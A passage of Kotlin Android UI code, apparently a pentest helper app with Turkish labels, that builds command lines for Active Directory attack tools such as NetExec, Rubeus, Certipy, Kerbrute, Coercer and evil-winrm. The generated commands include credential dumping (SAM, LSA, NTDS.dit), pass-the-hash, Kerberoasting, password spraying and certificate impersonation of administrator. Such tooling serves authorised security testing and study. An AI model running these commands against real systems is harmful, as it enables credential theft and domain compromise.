        ToggleOption(label = "-p http://127.0.0.1:8080 Proxy Kullan", checked = proxy, onCheckedChange = { proxy = it })
        ToggleOption(label = "-o wafw00f_result.txt Dosyaya Kaydet", checked = saveOutput, onCheckedChange = { saveOutput = it })

        val parts = mutableListOf("wafw00f", target)
        if (testAll) parts.add("-a")
        if (proxy) parts.addAll(listOf("-p", "http://127.0.0.1:8080"))
        if (saveOutput) parts.addAll(listOf("-o", "wafw00f_result.txt"))

        GeneratedCommandCard(command = parts.joinToString(" "), language = language)
    }
}

// 23. NETEXEC (NXC)
@Composable
fun NetExecBuilder(language: AppLanguage) {
    var proto by remember { mutableStateOf("smb") }
    var target by remember { mutableStateOf("10.10.10.0/24") }
    var user by remember { mutableStateOf("Administrator") }
    var pass by remember { mutableStateOf("Password123!") }
    var ntlmHash by remember { mutableStateOf("") }
    var kerberos by remember { mutableStateOf(false) }
    var domain by remember { mutableStateOf("") }
    var action by remember { mutableStateOf("--shares") }
    var localAuth by remember { mutableStateOf(false) }
    var continueOnSuccess by remember { mutableStateOf(false) }

    Column {
        Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(6.dp)) {
            listOf("smb" to "SMB", "winrm" to "WinRM", "ldap" to "LDAP", "mssql" to "MSSQL", "ssh" to "SSH", "rdp" to "RDP").forEach { (p, lbl) ->
                val sel = proto == p
                Box(
                    modifier = Modifier.weight(1f).clip(RoundedCornerShape(6.dp)).background(if (sel) CyberGreen.copy(alpha = 0.2f) else SurfaceDark).border(1.dp, if (sel) CyberGreen else BorderDark, RoundedCornerShape(6.dp)).clickable { proto = p }.padding(vertical = 5.dp),
                    contentAlignment = Alignment.Center
                ) { Text(text = lbl, fontSize = 11.sp, fontFamily = FontFamily.Monospace, color = if (sel) CyberGreen else TextSecondary) }
            }
        }
        Spacer(modifier = Modifier.height(8.dp))
        OutlinedTextField(value = target, onValueChange = { target = it }, label = { Text("Hedef IP / CIDR / Hostname") }, modifier = Modifier.fillMaxWidth(), colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary), singleLine = true)
        Spacer(modifier = Modifier.height(8.dp))
        Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(8.dp)) {
            OutlinedTextField(value = user, onValueChange = { user = it }, label = { Text("Kullanıcı (-u)") }, modifier = Modifier.weight(1f), colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary), singleLine = true)
            OutlinedTextField(value = pass, onValueChange = { pass = it }, label = { Text("Parola (-p)") }, modifier = Modifier.weight(1f), colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary), singleLine = true)
        }
        Spacer(modifier = Modifier.height(8.dp))
        OutlinedTextField(value = ntlmHash, onValueChange = { ntlmHash = it }, label = { Text("Pass-the-Hash / NTLM Hash (-H: opsiyonel)") }, modifier = Modifier.fillMaxWidth(), colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary), singleLine = true)
        Spacer(modifier = Modifier.height(8.dp))
        Text(text = "EYLEM VE SÖMÜRÜ MODÜLLERİ", fontSize = 10.sp, fontFamily = FontFamily.Monospace, color = TerminalCyan)
        Spacer(modifier = Modifier.height(4.dp))
        Row(modifier = Modifier.fillMaxWidth().horizontalScroll(rememberScrollState()), horizontalArrangement = Arrangement.spacedBy(6.dp)) {
            listOf(
                "--shares" to "Paylaşımlar",
                "--users" to "Kullanıcılar",
                "--groups" to "Gruplar",
                "--sessions" to "Oturumlar",
                "--pass-pol" to "Parola Politikası",
                "--sam" to "SAM Hashes",
                "--lsa" to "LSA Secrets",
                "--ntds" to "NTDS.dit Dökümü",
                "-M spider_plus" to "Hassas Dosya Avı",
                "--rid-brute 10000" to "RID Brute",
                "-x \"whoami\"" to "CMD Komutu",
                "-X \"Get-Process\"" to "PowerShell"
            ).forEach { (act, lbl) ->
                val sel = action == act
                Box(
                    modifier = Modifier.clip(RoundedCornerShape(6.dp)).background(if (sel) AccentPurple.copy(alpha = 0.2f) else SurfaceDark).border(1.dp, if (sel) AccentPurple else BorderDark, RoundedCornerShape(6.dp)).clickable { action = act }.padding(horizontal = 8.dp, vertical = 5.dp)
                ) { Text(text = "$act ($lbl)", fontSize = 11.sp, fontFamily = FontFamily.Monospace, color = if (sel) AccentPurple else TextPrimary) }
            }
        }
        Spacer(modifier = Modifier.height(6.dp))
        ToggleOption(label = "--local-auth Yerel Hesap Denetimi", checked = localAuth, onCheckedChange = { localAuth = it })
        ToggleOption(label = "-k Kerberos Kimlik Doğrulaması", checked = kerberos, onCheckedChange = { kerberos = it })
        ToggleOption(label = "--continue-on-success Başarılı Girişten Sonra Devam Et", checked = continueOnSuccess, onCheckedChange = { continueOnSuccess = it })

        val cmdParts = mutableListOf("netexec", proto, target, "-u", "'$user'")
        if (ntlmHash.isNotBlank()) {
            cmdParts.addAll(listOf("-H", ntlmHash.trim()))
        } else {
            cmdParts.addAll(listOf("-p", "'$pass'"))
        }
        if (domain.isNotBlank()) cmdParts.addAll(listOf("-d", domain))
        if (kerberos) cmdParts.add("-k")
        cmdParts.add(action)
        if (localAuth) cmdParts.add("--local-auth")
        if (continueOnSuccess) cmdParts.add("--continue-on-success")

        GeneratedCommandCard(command = cmdParts.joinToString(" "), language = language)
    }
}

// 24. COERCER
@Composable
fun CoercerBuilder(language: AppLanguage) {
    var mode by remember { mutableStateOf("coerce") }
    var target by remember { mutableStateOf("10.10.10.10") }
    var listener by remember { mutableStateOf("10.10.14.5") }
    var user by remember { mutableStateOf("domain_user") }
    var pass by remember { mutableStateOf("Password123!") }
    var domain by remember { mutableStateOf("corp.local") }
    var webdav by remember { mutableStateOf(false) }
    var rpc by remember { mutableStateOf(false) }
    var smb by remember { mutableStateOf(false) }

    Column {
        Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(8.dp)) {
            listOf("coerce" to "Zorla Tetikle (coerce)", "scan" to "Zafiyetleri Listele (scan)").forEach { (m, lbl) ->
                val sel = mode == m
                Box(
                    modifier = Modifier.weight(1f).clip(RoundedCornerShape(6.dp)).background(if (sel) CyberGreen.copy(alpha = 0.2f) else SurfaceDark).border(1.dp, if (sel) CyberGreen else BorderDark, RoundedCornerShape(6.dp)).clickable { mode = m }.padding(vertical = 6.dp),
                    contentAlignment = Alignment.Center
                ) { Text(text = lbl, fontSize = 11.sp, fontFamily = FontFamily.Monospace, color = if (sel) CyberGreen else TextSecondary) }
            }
        }
        Spacer(modifier = Modifier.height(8.dp))
        OutlinedTextField(value = target, onValueChange = { target = it }, label = { Text("Hedef DC IP (-t)") }, modifier = Modifier.fillMaxWidth(), colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary), singleLine = true)
        Spacer(modifier = Modifier.height(8.dp))
        OutlinedTextField(value = listener, onValueChange = { listener = it }, label = { Text("Dinleyici / Responder IP (-l)") }, modifier = Modifier.fillMaxWidth(), colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary), singleLine = true)
        Spacer(modifier = Modifier.height(8.dp))
        Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(6.dp)) {
            OutlinedTextField(value = user, onValueChange = { user = it }, label = { Text("Kullanıcı (-u)") }, modifier = Modifier.weight(1f), colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary), singleLine = true)
            OutlinedTextField(value = pass, onValueChange = { pass = it }, label = { Text("Parola (-p)") }, modifier = Modifier.weight(1f), colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary), singleLine = true)
        }
        Spacer(modifier = Modifier.height(8.dp))
        OutlinedTextField(value = domain, onValueChange = { domain = it }, label = { Text("Domain (-d)") }, modifier = Modifier.fillMaxWidth(), colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary), singleLine = true)
        Spacer(modifier = Modifier.height(6.dp))
        ToggleOption(label = "--webdav WebDAV Protokolünü Zorla", checked = webdav, onCheckedChange = { webdav = it })
        ToggleOption(label = "--rpc RPC Protokolünü Zorla", checked = rpc, onCheckedChange = { rpc = it })
        ToggleOption(label = "--smb SMB Protokolünü Zorla", checked = smb, onCheckedChange = { smb = it })

        val parts = mutableListOf("coercer", mode, "-t", target, "-l", listener, "-u", user, "-p", "'$pass'", "-d", domain)
        if (webdav) parts.add("--webdav")
        if (rpc) parts.add("--rpc")
        if (smb) parts.add("--smb")

        GeneratedCommandCard(command = parts.joinToString(" "), language = language)
    }
}

// 25. RUBEUS
@Composable
fun RubeusBuilder(language: AppLanguage) {
    var action by remember { mutableStateOf("kerberoast") }
    var domain by remember { mutableStateOf("corp.local") }
    var user by remember { mutableStateOf("") }
    var rc4Hash by remember { mutableStateOf("") }
    var noWrap by remember { mutableStateOf(true) }
    var saveOutput by remember { mutableStateOf(true) }

    Column {
        Text(text = "KERBEROS EYLEMİ", fontSize = 10.sp, fontFamily = FontFamily.Monospace, color = TerminalCyan)
        Spacer(modifier = Modifier.height(4.dp))
        Row(modifier = Modifier.fillMaxWidth().horizontalScroll(rememberScrollState()), horizontalArrangement = Arrangement.spacedBy(6.dp)) {
            listOf(
                "kerberoast" to "Kerberoasting (TGS)",
                "asreproast" to "AS-REP Roasting",
                "asktgt" to "TGT Talep Et",
                "tgtdeleg" to "TGT Delegasyon",
                "s4u" to "S4U Taklit",
                "dump" to "Biletleri Dök"
            ).forEach { (act, lbl) ->
                val sel = action == act
                Box(
                    modifier = Modifier.clip(RoundedCornerShape(6.dp)).background(if (sel) CyberGreen.copy(alpha = 0.2f) else SurfaceDark).border(1.dp, if (sel) CyberGreen else BorderDark, RoundedCornerShape(6.dp)).clickable { action = act }.padding(horizontal = 8.dp, vertical = 6.dp)
                ) { Text(text = "$act ($lbl)", fontSize = 11.sp, fontFamily = FontFamily.Monospace, color = if (sel) CyberGreen else TextSecondary) }
            }
        }
        Spacer(modifier = Modifier.height(8.dp))
        OutlinedTextField(value = domain, onValueChange = { domain = it }, label = { Text("Domain (/domain:corp.local)") }, modifier = Modifier.fillMaxWidth(), colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary), singleLine = true)
        Spacer(modifier = Modifier.height(8.dp))
        OutlinedTextField(value = user, onValueChange = { user = it }, label = { Text("Hedef Kullanıcı (/user: opsiyonel)") }, modifier = Modifier.fillMaxWidth(), colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary), singleLine = true)
        if (action == "asktgt") {
            Spacer(modifier = Modifier.height(8.dp))
            OutlinedTextField(value = rc4Hash, onValueChange = { rc4Hash = it }, label = { Text("RC4 NTLM Hash (/rc4:)") }, modifier = Modifier.fillMaxWidth(), colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary), singleLine = true)
        }
        Spacer(modifier = Modifier.height(6.dp))
        ToggleOption(label = "/nowrap Hashleri Tek Satırda Dök (Kırma için)", checked = noWrap, onCheckedChange = { noWrap = it })
        ToggleOption(label = "/outfile:hashes.txt Dosyaya Kaydet", checked = saveOutput, onCheckedChange = { saveOutput = it })

        val parts = mutableListOf("Rubeus.exe", action)
        if (domain.isNotBlank()) parts.add("/domain:$domain")
        if (user.isNotBlank()) parts.add("/user:$user")
        if (action == "asktgt" && rc4Hash.isNotBlank()) parts.add("/rc4:$rc4Hash")
        if (noWrap) parts.add("/nowrap")
        if (saveOutput) parts.add("/outfile:hashes.txt")

        GeneratedCommandCard(command = parts.joinToString(" "), language = language)
    }
}

// 26. ENUM4LINUX-NG
@Composable
fun Enum4linuxNgBuilder(language: AppLanguage) {
    var target by remember { mutableStateOf("10.10.10.100") }
    var user by remember { mutableStateOf("") }
    var pass by remember { mutableStateOf("") }
    var domain by remember { mutableStateOf("") }
    var allChecks by remember { mutableStateOf(true) }
    var enumUsers by remember { mutableStateOf(false) }
    var enumShares by remember { mutableStateOf(false) }
    var enumGroups by remember { mutableStateOf(false) }
    var passPolicy by remember { mutableStateOf(false) }
    var ridBrute by remember { mutableStateOf(false) }
    var saveOutput by remember { mutableStateOf(true) }

    Column {
        OutlinedTextField(value = target, onValueChange = { target = it }, label = { Text("Hedef IP (-A)") }, modifier = Modifier.fillMaxWidth(), colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary), singleLine = true)
        Spacer(modifier = Modifier.height(8.dp))
        Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(8.dp)) {
            OutlinedTextField(value = user, onValueChange = { user = it }, label = { Text("Kullanıcı (-u: opsiyonel)") }, modifier = Modifier.weight(1f), colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary), singleLine = true)
            OutlinedTextField(value = pass, onValueChange = { pass = it }, label = { Text("Parola (-p)") }, modifier = Modifier.weight(1f), colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary), singleLine = true)
        }
        Spacer(modifier = Modifier.height(6.dp))
        ToggleOption(label = "-A Tüm Kontrolleri Çalıştır (Önerilen)", checked = allChecks, onCheckedChange = { allChecks = it })
        if (!allChecks) {
            ToggleOption(label = "-U Kullanıcıları Listele", checked = enumUsers, onCheckedChange = { enumUsers = it })
            ToggleOption(label = "-S Paylaşımları Listele", checked = enumShares, onCheckedChange = { enumShares = it })
            ToggleOption(label = "-G Grupları Listele", checked = enumGroups, onCheckedChange = { enumGroups = it })
            ToggleOption(label = "-P Parola Politikasını Çek", checked = passPolicy, onCheckedChange = { passPolicy = it })
            ToggleOption(label = "-R RID Kaba Kuvveti Yap", checked = ridBrute, onCheckedChange = { ridBrute = it })
        }
        ToggleOption(label = "-oA enum4linux_report (JSON, YAML, Text Kaydet)", checked = saveOutput, onCheckedChange = { saveOutput = it })

        val parts = mutableListOf("enum4linux-ng")
        if (allChecks) {
            parts.add("-A")
        } else {
            if (enumUsers) parts.add("-U")
            if (enumShares) parts.add("-S")
            if (enumGroups) parts.add("-G")
            if (passPolicy) parts.add("-P")
            if (ridBrute) parts.add("-R")
        }
        if (user.isNotBlank()) parts.addAll(listOf("-u", user))
        if (pass.isNotBlank()) parts.addAll(listOf("-p", pass))
        if (domain.isNotBlank()) parts.addAll(listOf("-d", domain))
        if (saveOutput) parts.addAll(listOf("-oA", "enum4linux_report"))
        parts.add(target)

        GeneratedCommandCard(command = parts.joinToString(" "), language = language)
    }
}

// 27. BLOODHOUND
@Composable
fun BloodHoundBuilder(language: AppLanguage) {
    var domain by remember { mutableStateOf("corp.local") }
    var dc by remember { mutableStateOf("dc01.corp.local") }
    var dcIp by remember { mutableStateOf("10.10.10.10") }
    var user by remember { mutableStateOf("domain_user") }
    var pass by remember { mutableStateOf("Password123!") }
    var hashes by remember { mutableStateOf("") }
    var collectionMethod by remember { mutableStateOf("All") }
    var kerberos by remember { mutableStateOf(false) }
    var zipOutput by remember { mutableStateOf(true) }

    Column {
        OutlinedTextField(value = domain, onValueChange = { domain = it }, label = { Text("Domain (-d)") }, modifier = Modifier.fillMaxWidth(), colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary), singleLine = true)
        Spacer(modifier = Modifier.height(8.dp))
        Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(8.dp)) {
            OutlinedTextField(value = dc, onValueChange = { dc = it }, label = { Text("DC FQDN (-dc)") }, modifier = Modifier.weight(1f), colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary), singleLine = true)
            OutlinedTextField(value = dcIp, onValueChange = { dcIp = it }, label = { Text("DC IP (-ns)") }, modifier = Modifier.weight(1f), colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary), singleLine = true)
        }
        Spacer(modifier = Modifier.height(8.dp))
        Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(8.dp)) {
            OutlinedTextField(value = user, onValueChange = { user = it }, label = { Text("Kullanıcı (-u)") }, modifier = Modifier.weight(1f), colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary), singleLine = true)
            OutlinedTextField(value = pass, onValueChange = { pass = it }, label = { Text("Parola (-p)") }, modifier = Modifier.weight(1f), colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary), singleLine = true)
        }
        Spacer(modifier = Modifier.height(8.dp))
        OutlinedTextField(value = hashes, onValueChange = { hashes = it }, label = { Text("Pass-the-Hash (--hashes lm:ntlm: opsiyonel)") }, modifier = Modifier.fillMaxWidth(), colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary), singleLine = true)
        Spacer(modifier = Modifier.height(8.dp))
        Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(6.dp)) {
            listOf("All" to "All", "DCOnly" to "DCOnly", "LoggedOn" to "LoggedOn", "Session" to "Session").forEach { (c, lbl) ->
                val sel = collectionMethod == c
                Box(
                    modifier = Modifier.weight(1f).clip(RoundedCornerShape(6.dp)).background(if (sel) CyberGreen.copy(alpha = 0.2f) else SurfaceDark).border(1.dp, if (sel) CyberGreen else BorderDark, RoundedCornerShape(6.dp)).clickable { collectionMethod = c }.padding(vertical = 6.dp),
                    contentAlignment = Alignment.Center
                ) { Text(text = lbl, fontSize = 11.sp, fontFamily = FontFamily.Monospace, color = if (sel) CyberGreen else TextSecondary) }
            }
        }
        Spacer(modifier = Modifier.height(6.dp))
        ToggleOption(label = "--zip Çıktıları Zip Arşivine Paketle", checked = zipOutput, onCheckedChange = { zipOutput = it })
        ToggleOption(label = "-k Kerberos Kimlik Doğrulaması", checked = kerberos, onCheckedChange = { kerberos = it })

        val parts = mutableListOf("bloodhound-python", "-d", domain, "-u", user)
        if (hashes.isNotBlank()) parts.addAll(listOf("--hashes", hashes)) else parts.addAll(listOf("-p", "'$pass'"))
        parts.addAll(listOf("-dc", dc, "-ns", dcIp, "-c", collectionMethod))
        if (kerberos) parts.add("-k")
        if (zipOutput) parts.add("--zip")

        GeneratedCommandCard(command = parts.joinToString(" "), language = language)
    }
}

// 28. CERTIPY
@Composable
fun CertipyBuilder(language: AppLanguage) {
    var action by remember { mutableStateOf("find") }
    var domain by remember { mutableStateOf("corp.local") }
    var user by remember { mutableStateOf("user1") }
    var pass by remember { mutableStateOf("Pass123!") }
    var dcIp by remember { mutableStateOf("10.10.10.1") }
    var caName by remember { mutableStateOf("corp-CA") }
    var template by remember { mutableStateOf("ESC1") }
    var vulnerableOnly by remember { mutableStateOf(true) }

    Column {
        Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(6.dp)) {
            listOf("find" to "Zafiyet Bul (find)", "req" to "Talep Et (req)", "auth" to "TGT Al (auth)").forEach { (act, lbl) ->
                val sel = action == act
                Box(
                    modifier = Modifier.weight(1f).clip(RoundedCornerShape(6.dp)).background(if (sel) CyberGreen.copy(alpha = 0.2f) else SurfaceDark).border(1.dp, if (sel) CyberGreen else BorderDark, RoundedCornerShape(6.dp)).clickable { action = act }.padding(vertical = 6.dp),
                    contentAlignment = Alignment.Center
                ) { Text(text = lbl, fontSize = 11.sp, fontFamily = FontFamily.Monospace, color = if (sel) CyberGreen else TextSecondary) }
            }
        }
        Spacer(modifier = Modifier.height(8.dp))
        Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(8.dp)) {
            OutlinedTextField(value = domain, onValueChange = { domain = it }, label = { Text("Domain Adı") }, modifier = Modifier.weight(1f), colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary), singleLine = true)
            OutlinedTextField(value = dcIp, onValueChange = { dcIp = it }, label = { Text("DC IP (-dc-ip)") }, modifier = Modifier.weight(1f), colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary), singleLine = true)
        }
        Spacer(modifier = Modifier.height(8.dp))
        Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(8.dp)) {
            OutlinedTextField(value = user, onValueChange = { user = it }, label = { Text("Kullanıcı") }, modifier = Modifier.weight(1f), colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary), singleLine = true)
            OutlinedTextField(value = pass, onValueChange = { pass = it }, label = { Text("Parola") }, modifier = Modifier.weight(1f), colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary), singleLine = true)
        }
        if (action == "req") {
            Spacer(modifier = Modifier.height(8.dp))
            Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(8.dp)) {
                OutlinedTextField(value = caName, onValueChange = { caName = it }, label = { Text("CA Adı (-ca)") }, modifier = Modifier.weight(1f), colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary), singleLine = true)
                OutlinedTextField(value = template, onValueChange = { template = it }, label = { Text("Şablon (-template)") }, modifier = Modifier.weight(1f), colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary), singleLine = true)
            }
        }
        if (action == "find") {
            Spacer(modifier = Modifier.height(6.dp))
            ToggleOption(label = "-vulnerable Yalnızca İstismar Edilebilir Şablonları Listele", checked = vulnerableOnly, onCheckedChange = { vulnerableOnly = it })
        }

        val parts = mutableListOf("certipy", action, "-u", "'$user@$domain'", "-p", "'$pass'", "-dc-ip", dcIp)
        if (action == "find" && vulnerableOnly) parts.addAll(listOf("-vulnerable", "-stdout"))
        if (action == "req") parts.addAll(listOf("-ca", caName, "-template", template, "-upn", "administrator@$domain"))
        if (action == "auth") parts.addAll(listOf("-pfx", "administrator.pfx"))

        GeneratedCommandCard(command = parts.joinToString(" "), language = language)
    }
}

// 29. KERBRUTE
@Composable
fun KerbruteBuilder(language: AppLanguage) {
    var mode by remember { mutableStateOf("userenum") }
    var domain by remember { mutableStateOf("corp.local") }
    var dc by remember { mutableStateOf("10.10.10.1") }
    var userlist by remember { mutableStateOf("users.txt") }
    var passOrList by remember { mutableStateOf("Password123!") }
    var threads by remember { mutableStateOf("50") }
    var safeMode by remember { mutableStateOf(false) }

    Column {
        Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(6.dp)) {
            listOf("userenum" to "Kullanıcı (userenum)", "passwordspray" to "Püskürtme (spray)", "bruteforce" to "Kaba Kuvvet (brute)").forEach { (m, lbl) ->
                val sel = mode == m
                Box(
                    modifier = Modifier.weight(1f).clip(RoundedCornerShape(6.dp)).background(if (sel) CyberGreen.copy(alpha = 0.2f) else SurfaceDark).border(1.dp, if (sel) CyberGreen else BorderDark, RoundedCornerShape(6.dp)).clickable { mode = m }.padding(vertical = 6.dp),
                    contentAlignment = Alignment.Center
                ) { Text(text = lbl, fontSize = 10.sp, fontFamily = FontFamily.Monospace, color = if (sel) CyberGreen else TextSecondary) }
            }
        }
        Spacer(modifier = Modifier.height(8.dp))
        Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(8.dp)) {
            OutlinedTextField(value = domain, onValueChange = { domain = it }, label = { Text("Domain (-d)") }, modifier = Modifier.weight(1f), colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary), singleLine = true)
            OutlinedTextField(value = dc, onValueChange = { dc = it }, label = { Text("DC IP (--dc)") }, modifier = Modifier.weight(1f), colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary), singleLine = true)
        }
        Spacer(modifier = Modifier.height(8.dp))
        OutlinedTextField(value = userlist, onValueChange = { userlist = it }, label = { Text("Kullanıcı Listesi") }, modifier = Modifier.fillMaxWidth(), colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary), singleLine = true)
        if (mode != "userenum") {
            Spacer(modifier = Modifier.height(8.dp))
            OutlinedTextField(value = passOrList, onValueChange = { passOrList = it }, label = { Text(if (mode == "passwordspray") "Tek Parola" else "Parola Listesi") }, modifier = Modifier.fillMaxWidth(), colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary), singleLine = true)
        }
        Spacer(modifier = Modifier.height(6.dp))
        ToggleOption(label = "--safe Hesap Kilitlemeyi Engellemek İçin Yavaş Mod", checked = safeMode, onCheckedChange = { safeMode = it })

        val parts = mutableListOf("kerbrute", mode, "-d", domain, "--dc", dc)
        if (safeMode) parts.add("--safe")
        parts.addAll(listOf("-t", threads))
        if (mode == "userenum") {
            parts.add(userlist)
        } else if (mode == "passwordspray") {
            parts.addAll(listOf(userlist, passOrList))
        } else {
            parts.addAll(listOf(userlist, passOrList))
        }

        GeneratedCommandCard(command = parts.joinToString(" "), language = language)
    }
}

// 30. EVIL-WINRM
@Composable
fun EvilWinrmBuilder(language: AppLanguage) {
    var ip by remember { mutableStateOf("10.10.10.100") }
    var user by remember { mutableStateOf("Administrator") }
    var passOrHash by remember { mutableStateOf("Password123!") }
    var isHash by remember { mutableStateOf(false) }
    var scriptsDir by remember { mutableStateOf("") }
    var exesDir by remember { mutableStateOf("") }
    var useSsl by remember { mutableStateOf(false) }

    Column {
        OutlinedTextField(value = ip, onValueChange = { ip = it }, label = { Text("Hedef IP (-i)") }, modifier = Modifier.fillMaxWidth(), colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary), singleLine = true)
        Spacer(modifier = Modifier.height(8.dp))
        OutlinedTextField(value = user, onValueChange = { user = it }, label = { Text("Kullanıcı (-u)") }, modifier = Modifier.fillMaxWidth(), colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary), singleLine = true)
        Spacer(modifier = Modifier.height(8.dp))
        OutlinedTextField(value = passOrHash, onValueChange = { passOrHash = it }, label = { Text(if (isHash) "NTLM Hash (-H)" else "Parola (-p)") }, modifier = Modifier.fillMaxWidth(), colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary), singleLine = true)
        Spacer(modifier = Modifier.height(6.dp))
        ToggleOption(label = "Pass-the-Hash / NTLM Hash Girişi (-H)", checked = isHash, onCheckedChange = { isHash = it })
        ToggleOption(label = "-S SSL/TLS ile Güvenli WinRM (Port 5986)", checked = useSsl, onCheckedChange = { useSsl = it })

        val parts = mutableListOf("evil-winrm", "-i", ip, "-u", "'$user'")
        if (isHash) parts.addAll(listOf("-H", passOrHash)) else parts.addAll(listOf("-p", "'$passOrHash'"))
        if (scriptsDir.isNotBlank()) parts.addAll(listOf("-s", scriptsDir))
        if (exesDir.isNotBlank()) parts.addAll(listOf("-e", exesDir))
        if (useSsl) parts.add("-S")

        GeneratedCommandCard(command = parts.joinToString(" "), language = language)
    }
}

// 31. RESPONDER
@Composable
fun ResponderBuilder(language: AppLanguage) {
